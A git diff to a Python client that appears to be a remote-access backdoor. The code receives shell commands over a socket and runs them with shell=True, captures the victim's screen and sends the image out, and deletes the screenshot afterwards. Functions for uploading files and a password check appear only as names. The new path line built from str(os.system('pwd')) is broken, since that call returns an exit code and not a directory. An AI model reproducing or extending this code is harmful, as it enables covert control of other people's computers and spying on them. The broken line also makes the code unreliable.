@@ -3,8 +3,10 @@
 from glob import glob
 import json
 import subprocess
+from subprocess import PIPE
 import os
-import pyautogui
+# import pyautogui
+import PIL.ImageGrab
 from Client import *
 
 # define globals
@@ -74,7 +76,9 @@ def exe_commads(my_socket):
              my_socket.send_results(res)
              
 def runshell(cmd):
-     output = subprocess.run(cmd , shell=True, capture_output=True)
+    #  output = subprocess.run(cmd , shell=True, capture_output=True)
+     output = subprocess.run(cmd , shell=True,stdout=PIPE, stderr=PIPE)  # For python version 3.6.9
+
      if output.stderr.decode("utf-8") == "":
          std_out = output.stdout.decode("utf-8")
      else :
@@ -107,12 +111,13 @@ def upload_file_folder(my_socket):
 
 def capture_screenshot(my_socket):
      print("[+] Taking Screenshot")
-     screenshot = pyautogui.screenshot()
+     screenshot = PIL.ImageGrab.grab()
      screenshot_name = "screenshot.png"
-     screenshot.save(screenshot_name)
-     my_socket.send_file(screenshot_name)
+     ss_path = str(os.system('pwd')) + screenshot_name
+     screenshot.save(ss_path)
+     my_socket.send_file(ss_path)
      print("[+] Screenshot Sent Successfully")
-     os.remove(screenshot_name) 
+     os.remove(ss_path) 
 
 def checkpass(my_socket):
      i = 0
